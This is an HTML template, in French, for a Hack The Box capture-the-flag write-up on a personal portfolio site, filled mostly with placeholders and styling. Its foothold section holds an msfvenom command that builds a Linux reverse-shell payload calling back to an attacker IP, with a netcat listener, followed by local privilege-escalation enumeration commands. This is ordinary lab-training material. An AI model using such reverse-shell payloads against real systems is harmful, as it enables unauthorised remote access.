@@ -1,0 +1,516 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+
+  <!-- ═══════════════════════════════════════════════
+       META À MODIFIER
+  ═══════════════════════════════════════════════ -->
+  <title>HTB · NomDeLaBox — Bertrand VEY</title>
+  <meta name="description" content="Writeup HTB NomDeLaBox — résumé court de l'approche." />
+
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700&family=Inter:wght@400;500;600&display=swap" rel="stylesheet" />
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+    :root {
+      --bg:       #0a0e17;
+      --surface:  #111827;
+      --border:   #1e2d40;
+      --green:    #00ff9d;
+      --purple:   #7c3aed;
+      --text:     #e2e8f0;
+      --muted:    #64748b;
+      --font-mono:'JetBrains Mono', monospace;
+      --font-body:'Inter', sans-serif;
+    }
+    html { scroll-behavior: smooth; }
+    body { background: var(--bg); color: var(--text); font-family: var(--font-body); font-size: 16px; line-height: 1.7; }
+
+    /* ── NAV ── */
+    nav {
+      position: fixed; top: 0; left: 0; right: 0; z-index: 100;
+      display: flex; align-items: center; gap: 1.2rem;
+      padding: 0 2rem; height: 52px;
+      background: rgba(10,14,23,0.9); backdrop-filter: blur(12px);
+      border-bottom: 1px solid var(--border);
+      font-family: var(--font-mono); font-size: 0.8rem;
+    }
+    nav a { color: var(--muted); text-decoration: none; transition: color .2s; }
+    nav a:hover { color: var(--green); }
+    nav .sep { color: var(--border); }
+    nav .current { color: var(--green); }
+
+    /* ── LAYOUT ── */
+    .page { max-width: 820px; margin: 0 auto; padding: 5.5rem 2rem 4rem; }
+
+    /* ── HEADER BOX ── */
+    .box-header {
+      background: var(--surface);
+      border: 1px solid var(--border);
+      border-radius: 10px;
+      padding: 1.8rem 2rem;
+      display: flex; flex-direction: column; gap: 1rem;
+      margin-bottom: 2.5rem;
+    }
+    .box-top { display: flex; align-items: center; gap: 0.8rem; flex-wrap: wrap; }
+
+    .badge {
+      font-family: var(--font-mono); font-size: 0.7rem; font-weight: 700;
+      padding: 0.2rem 0.55rem; border-radius: 4px;
+      text-transform: uppercase; letter-spacing: 0.06em;
+    }
+    .badge-easy   { background: rgba(34,197,94,0.15);  color: #4ade80; }
+    .badge-medium { background: rgba(251,191,36,0.15); color: #fbbf24; }
+    .badge-hard   { background: rgba(239,68,68,0.15);  color: #f87171; }
+    .badge-insane { background: rgba(124,58,237,0.2);  color: #a78bfa; }
+    .badge-os     { background: rgba(96,165,250,0.08); border: 1px solid rgba(96,165,250,0.2); color: #93c5fd; }
+    .badge-retired{ background: rgba(100,116,139,0.15); color: var(--muted); }
+
+    .box-title { font-family: var(--font-mono); font-size: clamp(1.5rem, 4vw, 2.2rem); font-weight: 700; color: var(--text); }
+    .box-desc  { color: var(--muted); font-size: 0.9rem; max-width: 560px; }
+
+    .box-meta  {
+      display: flex; flex-wrap: wrap; gap: 1.4rem;
+      border-top: 1px solid var(--border); padding-top: 1rem;
+      font-family: var(--font-mono); font-size: 0.78rem; color: var(--muted);
+    }
+    .box-meta span strong { color: var(--text); }
+
+    /* tags techniques */
+    .tag-list { display: flex; flex-wrap: wrap; gap: 0.4rem; }
+    .tag {
+      font-family: var(--font-mono); font-size: 0.7rem;
+      background: rgba(0,255,157,0.07); border: 1px solid rgba(0,255,157,0.2);
+      color: var(--green); border-radius: 4px; padding: 0.15rem 0.5rem;
+    }
+
+    /* ── SOMMAIRE ── */
+    .toc {
+      background: var(--surface); border: 1px solid var(--border);
+      border-radius: 8px; padding: 1.2rem 1.5rem; margin-bottom: 2.5rem;
+    }
+    .toc-title { font-family: var(--font-mono); font-size: 0.72rem; color: var(--green); letter-spacing: 0.12em; text-transform: uppercase; margin-bottom: 0.7rem; }
+    .toc ol { padding-left: 1.2rem; }
+    .toc li { font-family: var(--font-mono); font-size: 0.82rem; margin-bottom: 0.25rem; }
+    .toc a { color: var(--muted); text-decoration: none; }
+    .toc a:hover { color: var(--green); }
+
+    /* ── SECTIONS WRITEUP ── */
+    .wp-section { margin-bottom: 3rem; }
+    .wp-section h2 {
+      font-family: var(--font-mono); font-size: 1.05rem; font-weight: 700;
+      color: var(--text); margin-bottom: 1rem;
+      display: flex; align-items: center; gap: 0.6rem;
+    }
+    .wp-section h2 .step-num {
+      display: inline-flex; align-items: center; justify-content: center;
+      width: 26px; height: 26px; border-radius: 50%;
+      background: rgba(0,255,157,0.1); border: 1px solid rgba(0,255,157,0.3);
+      color: var(--green); font-size: 0.72rem; font-weight: 700; flex-shrink: 0;
+    }
+    .wp-section h3 {
+      font-family: var(--font-mono); font-size: 0.88rem; font-weight: 600;
+      color: #a78bfa; margin: 1.2rem 0 0.5rem;
+    }
+    .wp-section p { color: #94a3b8; font-size: 0.9rem; margin-bottom: 0.8rem; }
+    .wp-section ul, .wp-section ol { padding-left: 1.4rem; color: #94a3b8; font-size: 0.9rem; margin-bottom: 0.8rem; }
+    .wp-section li { margin-bottom: 0.3rem; }
+
+    /* bloc de code */
+    .code-block {
+      background: #080c13; border: 1px solid var(--border);
+      border-radius: 8px; overflow: hidden; margin: 0.8rem 0 1.2rem;
+    }
+    .code-bar {
+      display: flex; align-items: center; justify-content: space-between;
+      padding: 0.4rem 1rem; background: #0d1421;
+      border-bottom: 1px solid var(--border);
+      font-family: var(--font-mono); font-size: 0.7rem; color: var(--muted);
+    }
+    .code-bar .lang { color: var(--green); }
+    .code-bar .copy-btn {
+      cursor: pointer; background: none; border: none; color: var(--muted);
+      font-family: var(--font-mono); font-size: 0.68rem;
+      transition: color .2s; padding: 0;
+    }
+    .code-bar .copy-btn:hover { color: var(--green); }
+    pre {
+      padding: 1.1rem 1.3rem; overflow-x: auto;
+      font-family: var(--font-mono); font-size: 0.82rem;
+      line-height: 1.7; color: var(--text); margin: 0;
+    }
+    /* coloration minimaliste */
+    .hl-cmd    { color: #00ff9d; }
+    .hl-flag   { color: #60a5fa; }
+    .hl-str    { color: #fbbf24; }
+    .hl-comment{ color: #475569; }
+    .hl-ip     { color: #a78bfa; }
+    .hl-ok     { color: #4ade80; }
+    .hl-warn   { color: #f87171; }
+
+    /* image / screenshot */
+    .screenshot {
+      border: 1px solid var(--border); border-radius: 8px;
+      overflow: hidden; margin: 0.8rem 0 1.2rem;
+    }
+    .screenshot-bar {
+      padding: 0.4rem 1rem; background: #0d1421;
+      border-bottom: 1px solid var(--border);
+      font-family: var(--font-mono); font-size: 0.7rem; color: var(--muted);
+    }
+    .screenshot img { width: 100%; display: block; }
+    .screenshot-placeholder {
+      min-height: 160px; background: #0d1421;
+      display: flex; align-items: center; justify-content: center;
+      color: var(--muted); font-family: var(--font-mono); font-size: 0.8rem;
+    }
+
+    /* callout */
+    .callout {
+      display: flex; gap: 0.8rem; align-items: flex-start;
+      border-radius: 8px; padding: 1rem 1.2rem; margin: 0.8rem 0 1.2rem;
+      font-size: 0.88rem;
+    }
+    .callout-icon { font-size: 1rem; flex-shrink: 0; margin-top: 0.1rem; }
+    .callout.info  { background: rgba(96,165,250,0.07); border: 1px solid rgba(96,165,250,0.2); color: #93c5fd; }
+    .callout.warn  { background: rgba(251,191,36,0.07); border: 1px solid rgba(251,191,36,0.2); color: #fde68a; }
+    .callout.flag  { background: rgba(0,255,157,0.07);  border: 1px solid rgba(0,255,157,0.2);  color: var(--green); font-family: var(--font-mono); }
+    .callout.vuln  { background: rgba(239,68,68,0.07);  border: 1px solid rgba(239,68,68,0.2);  color: #fca5a5; }
+
+    /* ── FLAG FINAL ── */
+    .flag-section {
+      background: var(--surface); border: 1px solid rgba(0,255,157,0.3);
+      border-radius: 10px; padding: 1.8rem;
+      text-align: center; margin-bottom: 3rem;
+      box-shadow: 0 0 40px rgba(0,255,157,0.05);
+    }
+    .flag-label { font-family: var(--font-mono); font-size: 0.72rem; color: var(--green); letter-spacing: 0.15em; text-transform: uppercase; margin-bottom: 0.5rem; }
+    .flag-value { font-family: var(--font-mono); font-size: 1rem; color: var(--green); word-break: break-all; }
+    .flag-type  { font-family: var(--font-mono); font-size: 0.75rem; color: var(--muted); margin-top: 0.3rem; }
+
+    /* ── LESSONS / KEY TAKEAWAYS ── */
+    .takeaways { display: flex; flex-direction: column; gap: 0.7rem; margin-bottom: 3rem; }
+    .takeaway {
+      display: flex; gap: 0.8rem; align-items: flex-start;
+      background: var(--surface); border: 1px solid var(--border);
+      border-radius: 8px; padding: 0.9rem 1.1rem;
+      font-size: 0.88rem; color: #94a3b8;
+    }
+    .takeaway-icon { color: var(--green); font-size: 0.95rem; flex-shrink: 0; margin-top: 0.1rem; }
+
+    /* ── FOOTER NAV ── */
+    .nav-writeups {
+      display: flex; justify-content: space-between; align-items: center;
+      border-top: 1px solid var(--border); padding-top: 2rem;
+      font-family: var(--font-mono); font-size: 0.8rem;
+    }
+    .nav-writeups a { color: var(--muted); text-decoration: none; transition: color .2s; }
+    .nav-writeups a:hover { color: var(--green); }
+
+    footer {
+      border-top: 1px solid var(--border); text-align: center;
+      padding: 1.4rem; font-family: var(--font-mono); font-size: 0.72rem; color: var(--muted);
+      margin-top: 3rem;
+    }
+
+    @media (max-width: 600px) {
+      .box-meta { gap: 0.8rem; }
+    }
+  </style>
+</head>
+<body>
+
+<!-- NAV BREADCRUMB -->
+<nav>
+  <a href="../index.html">~/portfolio</a>
+  <span class="sep">/</span>
+  <a href="../index.html#writeups">writeups</a>
+  <span class="sep">/</span>
+  <!-- ① MODIFIER : nom de la box -->
+  <span class="current">NomDeLaBox</span>
+</nav>
+
+<div class="page">
+
+  <!-- ══════════════════════════════════════════
+       ② EN-TÊTE DE LA BOX — TOUT MODIFIER ICI
+  ══════════════════════════════════════════ -->
+  <div class="box-header">
+    <div class="box-top">
+      <!-- Choisir UN badge de difficulté, supprimer les autres -->
+      <span class="badge badge-easy">Easy</span>
+      <!-- <span class="badge badge-medium">Medium</span> -->
+      <!-- <span class="badge badge-hard">Hard</span>    -->
+      <!-- <span class="badge badge-insane">Insane</span> -->
+
+      <!-- OS de la machine -->
+      <span class="badge badge-os">🐧 Linux</span>
+      <!-- <span class="badge badge-os">🪟 Windows</span> -->
+
+      <span class="badge badge-retired">Retired</span>
+    </div>
+
+    <div class="box-title">NomDeLaBox</div>
+    <div class="box-desc">
+      <!-- Résumé en 1–2 phrases de ce que fait cette box -->
+      Description courte de la box : quels services exposés, quel angle d'attaque principal, difficulté perçue.
+    </div>
+
+    <div class="box-meta">
+      <span><strong>IP cible</strong> &nbsp;10.10.10.XXX</span>
+      <span><strong>Points</strong> &nbsp;20 pts</span>
+      <span><strong>Auteur</strong> &nbsp;HTBAuthor</span>
+      <span><strong>Date writeup</strong> &nbsp;Juin 2026</span>
+    </div>
+
+    <!-- Tags techniques de la box -->
+    <div class="tag-list">
+      <span class="tag">SMB</span>
+      <span class="tag">CVE-XXXX-XXXX</span>
+      <span class="tag">PrivEsc</span>
+      <span class="tag">Web</span>
+      <!-- Ajouter / supprimer des tags librement -->
+    </div>
+  </div>
+
+  <!-- ── SOMMAIRE ── -->
+  <div class="toc">
+    <div class="toc-title">// Sommaire</div>
+    <ol>
+      <li><a href="#recon">Reconnaissance</a></li>
+      <li><a href="#enum">Énumération</a></li>
+      <li><a href="#foothold">Foothold</a></li>
+      <li><a href="#privesc">Élévation de privilèges</a></li>
+      <li><a href="#flags">Flags</a></li>
+      <li><a href="#lessons">Ce que j'ai retenu</a></li>
+    </ol>
+  </div>
+
+
+  <!-- ══════════════════════════════════════════
+       ③ CONTENU — MODIFIER LE TEXTE, GARDER LES BLOCS
+  ══════════════════════════════════════════ -->
+
+  <!-- 1. RECONNAISSANCE -->
+  <div class="wp-section" id="recon">
+    <h2><span class="step-num">1</span> Reconnaissance</h2>
+
+    <p>On commence par un scan Nmap pour identifier les ports ouverts et les services exposés.</p>
+
+    <div class="code-block">
+      <div class="code-bar">
+        <span class="lang">bash</span>
+        <button class="copy-btn" onclick="copyCode(this)">copier</button>
+      </div>
+<pre><span class="hl-cmd">nmap</span> <span class="hl-flag">-sC -sV -oN</span> nmap/initial <span class="hl-ip">10.10.10.XXX</span></pre>
+    </div>
+
+    <!-- Screenshot optionnel -->
+    <div class="screenshot">
+      <div class="screenshot-bar">résultat nmap — ports ouverts</div>
+      <!-- Remplacer par : <img src="../img/nombox-nmap.png" alt="Résultat nmap" /> -->
+      <div class="screenshot-placeholder">[ Coller ici le screenshot ou supprimer ce bloc ]</div>
+    </div>
+
+    <div class="code-block">
+      <div class="code-bar"><span class="lang">output</span></div>
+<pre><span class="hl-ok">PORT   STATE SERVICE VERSION</span>
+<span class="hl-ip">22</span>/tcp open  ssh     OpenSSH X.X
+<span class="hl-ip">80</span>/tcp open  http    Apache httpd X.X
+<span class="hl-comment"># Ajouter les ports réels ici</span></pre>
+    </div>
+
+    <div class="callout info">
+      <span class="callout-icon">ℹ</span>
+      <div>Note ou observation importante sur le résultat du scan (version vulnérable, service inhabituel, etc.).</div>
+    </div>
+  </div>
+
+
+  <!-- 2. ÉNUMÉRATION -->
+  <div class="wp-section" id="enum">
+    <h2><span class="step-num">2</span> Énumération</h2>
+
+    <h3>Service HTTP (port 80)</h3>
+    <p>Description de ce qu'on trouve sur le web : page d'accueil, technologie, formulaires, etc.</p>
+
+    <div class="code-block">
+      <div class="code-bar">
+        <span class="lang">bash</span>
+        <button class="copy-btn" onclick="copyCode(this)">copier</button>
+      </div>
+<pre><span class="hl-cmd">gobuster</span> dir <span class="hl-flag">-u</span> http://<span class="hl-ip">10.10.10.XXX</span> <span class="hl-flag">-w</span> /usr/share/wordlists/dirb/common.txt</pre>
+    </div>
+
+    <h3>SMB / autre service</h3>
+    <p>Ce qu'on trouve en énumérant les autres services. Adapter selon la box.</p>
+
+    <div class="code-block">
+      <div class="code-bar">
+        <span class="lang">bash</span>
+        <button class="copy-btn" onclick="copyCode(this)">copier</button>
+      </div>
+<pre><span class="hl-cmd">smbclient</span> <span class="hl-flag">-L</span> //<span class="hl-ip">10.10.10.XXX</span> <span class="hl-flag">-N</span>
+<span class="hl-comment"># Ou toute autre commande d'énumération</span></pre>
+    </div>
+
+    <div class="callout warn">
+      <span class="callout-icon">⚠</span>
+      <div>Piège ou fausse piste rencontrée durant l'énumération. Utile pour ne pas refaire la même erreur.</div>
+    </div>
+  </div>
+
+
+  <!-- 3. FOOTHOLD -->
+  <div class="wp-section" id="foothold">
+    <h2><span class="step-num">3</span> Foothold</h2>
+
+    <p>Explication de la vulnérabilité identifiée et de la méthode d'exploitation.</p>
+
+    <div class="callout vuln">
+      <span class="callout-icon">⚡</span>
+      <div><strong>Vulnérabilité :</strong> CVE-XXXX-XXXX — Description de la faille exploitée.</div>
+    </div>
+
+    <div class="code-block">
+      <div class="code-bar">
+        <span class="lang">bash</span>
+        <button class="copy-btn" onclick="copyCode(this)">copier</button>
+      </div>
+<pre><span class="hl-comment"># Commande d'exploitation</span>
+<span class="hl-cmd">msfvenom</span> <span class="hl-flag">-p</span> linux/x64/shell_reverse_tcp <span class="hl-flag">LHOST=</span><span class="hl-ip">10.10.14.X</span> <span class="hl-flag">LPORT=</span><span class="hl-str">4444</span> <span class="hl-flag">-f</span> elf <span class="hl-flag">-o</span> shell.elf</pre>
+    </div>
+
+    <div class="code-block">
+      <div class="code-bar">
+        <span class="lang">bash</span>
+        <button class="copy-btn" onclick="copyCode(this)">copier</button>
+      </div>
+<pre><span class="hl-comment"># Listener</span>
+<span class="hl-cmd">nc</span> <span class="hl-flag">-lvnp</span> <span class="hl-str">4444</span>
+
+<span class="hl-comment"># Résultat attendu</span>
+<span class="hl-ok">connect to [10.10.14.X] from (UNKNOWN) [10.10.10.XXX] XXXXX</span>
+<span class="hl-ok">id</span>
+uid=<span class="hl-str">33</span>(www-data) gid=<span class="hl-str">33</span>(www-data) groups=<span class="hl-str">33</span>(www-data)</pre>
+    </div>
+
+    <div class="screenshot">
+      <div class="screenshot-bar">shell obtenu</div>
+      <div class="screenshot-placeholder">[ Screenshot du shell initial ]</div>
+    </div>
+
+    <!-- Flag user (optionnel à cette étape) -->
+    <div class="callout flag">
+      <span class="callout-icon">🚩</span>
+      <div>user.txt — récupéré en tant que <strong>nomutilisateur</strong></div>
+    </div>
+  </div>
+
+
+  <!-- 4. PRIVESC -->
+  <div class="wp-section" id="privesc">
+    <h2><span class="step-num">4</span> Élévation de privilèges</h2>
+
+    <p>Méthode utilisée pour passer de l'utilisateur courant à root.</p>
+
+    <h3>Énumération locale</h3>
+
+    <div class="code-block">
+      <div class="code-bar">
+        <span class="lang">bash</span>
+        <button class="copy-btn" onclick="copyCode(this)">copier</button>
+      </div>
+<pre><span class="hl-comment"># Recherche de vecteurs de privesc courants</span>
+<span class="hl-cmd">sudo</span> <span class="hl-flag">-l</span>
+<span class="hl-cmd">find</span> / <span class="hl-flag">-perm -4000</span> 2>/dev/null     <span class="hl-comment"># SUID</span>
+<span class="hl-cmd">cat</span> /etc/crontab</pre>
+    </div>
+
+    <h3>Exploitation</h3>
+    <p>Description du vecteur trouvé et de l'exploitation.</p>
+
+    <div class="code-block">
+      <div class="code-bar">
+        <span class="lang">bash</span>
+        <button class="copy-btn" onclick="copyCode(this)">copier</button>
+      </div>
+<pre><span class="hl-comment"># Commandes de la privesc</span>
+<span class="hl-cmd">commande</span> <span class="hl-flag">--option</span> <span class="hl-str">valeur</span>
+
+<span class="hl-ok"># root obtenu</span>
+uid=<span class="hl-str">0</span>(root) gid=<span class="hl-str">0</span>(root) groups=<span class="hl-str">0</span>(root)</pre>
+    </div>
+
+    <div class="screenshot">
+      <div class="screenshot-bar">root shell</div>
+      <div class="screenshot-placeholder">[ Screenshot du shell root ]</div>
+    </div>
+  </div>
+
+
+  <!-- 5. FLAGS -->
+  <div id="flags">
+    <div style="display:grid; grid-template-columns:1fr 1fr; gap:1.2rem; margin-bottom:3rem;">
+      <div class="flag-section">
+        <div class="flag-label">// user.txt</div>
+        <div class="flag-value">a1b2c3d4e5f6...XXXX</div>
+        <div class="flag-type">Obtenu en tant que : nomutilisateur</div>
+      </div>
+      <div class="flag-section">
+        <div class="flag-label">// root.txt</div>
+        <div class="flag-value">f6e5d4c3b2a1...XXXX</div>
+        <div class="flag-type">Obtenu en tant que : root</div>
+      </div>
+    </div>
+  </div>
+
+
+  <!-- 6. LESSONS LEARNED -->
+  <div class="wp-section" id="lessons">
+    <h2><span class="step-num">5</span> Ce que j'ai retenu</h2>
+    <div class="takeaways">
+      <div class="takeaway">
+        <span class="takeaway-icon">→</span>
+        <div>Premier enseignement : technique, outil ou réflexe acquis grâce à cette box.</div>
+      </div>
+      <div class="takeaway">
+        <span class="takeaway-icon">→</span>
+        <div>Deuxième enseignement : fausse piste évitée, erreur corrigée, méthodologie améliorée.</div>
+      </div>
+      <div class="takeaway">
+        <span class="takeaway-icon">→</span>
+        <div>Troisième enseignement : ressource ou CVE à approfondir.</div>
+      </div>
+    </div>
+  </div>
+
+
+  <!-- ── NAV INTER-WRITEUPS ── -->
+  <div class="nav-writeups">
+    <a href="writeup-precedent.html">← WriteupPrécédent</a>
+    <a href="../index.html#writeups">↑ Tous les writeups</a>
+    <a href="writeup-suivant.html">WriteupSuivant →</a>
+  </div>
+
+</div><!-- /page -->
+
+<footer>
+  Bertrand VEY © 2026 &nbsp;·&nbsp; <span style="color:var(--green)">~/writeups/NomDeLaBox</span> &nbsp;·&nbsp;
+  Publié uniquement pour machines <em>retirées</em> HTB
+</footer>
+
+<script>
+  /* Copie du code dans le presse-papier */
+  function copyCode(btn) {
+    const pre = btn.closest('.code-block').querySelector('pre');
+    navigator.clipboard.writeText(pre.innerText).then(() => {
+      btn.textContent = 'copié ✓';
+      setTimeout(() => btn.textContent = 'copier', 1800);
+    });
+  }
+</script>
+</body>
+</html>
